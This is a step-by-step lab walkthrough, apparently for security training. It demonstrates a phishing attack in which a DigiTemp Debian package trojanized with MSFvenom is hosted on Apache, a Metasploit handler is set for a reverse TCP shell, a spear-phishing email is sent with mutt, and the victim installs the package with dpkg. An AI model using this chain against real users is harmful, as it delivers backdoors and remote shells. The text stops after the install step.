Real-life examples show that even the strongest technical security controls can be easily compromised by exploiting the weakest link: people. Actions like inserting an unauthorized USB drive into a workstation (as seen with Stuxnet) or opening a suspicious email attachment (as in the case of BlackEnergy) can provide attackers with the entry point they need to breach system infrastructure.

A malicious installer has been created using DigiTemp, a utility for reading values (mainly temperature) from 1-wire devices. A Trojan backdoor has been inserted into it using _MSFvenom_, a payload builder within the _Metasploit Framework_.

Note that the program itself is not inherently vulnerable.

To make the malicious package available for download via a web browser, it has been placed in the Apache server's webroot folder _/var/www/html_.

To start the Apache server, run the following command:
`service apache2 start`
# Starting Metasploit Framework

_MSFconsole_ is a command-line interface for the Metasploit Framework, an open-source security framework for penetration testing and vulnerability assessment. The Metasploit Framework is a collection of tools, modules, and libraries that can be used to test the security of systems and applications, and MSFconsole is one of the key components of the framework.

We will be setting up a listener to wait for incoming connections using a Metasploit exploit module.
To initiate Metasploit, enter the following command:
`msfconsole`
### Selecting Module

_The Generic Payload Handler_ provides all of the features of the Metasploit payload system to exploits launched outside of the framework.
To select the handler module, use the following command:
`use exploit/multi/handler`

To display the options for the handler module, use the following command:
`options`

Two settings are listed, of which both are required. Note that only LHOST is empty.
Configure the module to listen on the localhost IP:
`set LHOST 127.0.0.1`

Specify a new port number for the listener:
`set LPORT 443`

Specify the payload that must be sent to the target once they connect to the listener. Select the reverse TCP command shell payload as follows:
`set PAYLOAD linux/x86/shell/reverse_tcp`

Start the listener by entering the exploit.
`exploit`
# Sending Phishing Email

For this attack, it is necessary to send a spear-phishing email that contains a download link.

Open a new terminal to send a phishing email.

_Postfix_ is a widely used _Mail Transfer Agent (MTA)_ on Linux systems. It is a powerful and dependable mail server capable of handling large volumes of email traffic. However, to utilize Postfix to send and receive emails, the Postfix server must be running on the system.
`service postfix start`

Once enabled, the Postfix service listens on the SMTP port (port 25) and is ready to receive incoming email messages.

To send an invitation to download a utility from a website, run the following command:
`echo "This utility is very useful. Download from <a href="http://192.168.1.100/digitemp.deb">here</a>." | mutt ‑e "set content_type=text/html" ‑s "Digitemp Download" ‑‑ root@192.168.1.100`

The -e option is used to set the content type of the email to HTML.
The -s option is used to set the subject of the email.
### Checking Email

_Mutt_ is a command-line email client for Unix-based systems, designed for terminal/console environments. It supports various email protocols, including POP3, IMAP, and SMTP.

Mutt allows users to manage their email entirely from the command line, with a built-in editor for composing messages and features for filtering, sorting, and searching emails based on multiple criteria.

To read the email using Mutt, enter the following command:
`mutt`

When prompted, press _enter_ to create the _/root/Mail_ directory.
# Reading Email

> Note: It is crucial to follow the instructions carefully in this step and the next.

The received email should be visible in the inbox. Press _Enter_ to open it.
Next, press _v_ to view the attachment and _enter_ to open it.

The phishing email will display the download link. Press _CTRL + B_ to click on it, then press _enter twice_.

This will open the URL in your default browser. Choose _Save File_ and click _OK_ to download the file.

### Installing Package

_dpkg_ is the Debian Package Manager, a command-line tool used to install, remove, and manage packages on Debian-based systems. The dpkg tool is responsible for unpacking and installing individual package files in the .deb format.

Navigate to the Downloads directory where the downloaded file is located.

cd /root/Downloads

Afterwards, attempt to install the downloaded digitemp.deb package:

sudo dpkg -i digitemp.deb

The -i option stands for install.

The output indicates that the package was installed successfully
